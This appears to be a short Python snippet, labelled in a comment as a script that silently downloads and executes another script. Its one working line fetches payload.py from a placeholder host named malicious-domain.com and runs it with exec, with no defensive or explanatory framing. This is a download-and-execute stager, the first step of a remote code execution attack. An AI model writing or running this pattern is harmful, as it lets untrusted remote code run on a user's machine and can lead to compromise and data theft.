#ython script that downloads and executes another script silently.
import urllib.request
exec(urllib.request.urlopen("http://malicious-domain.com/payload.py").read())
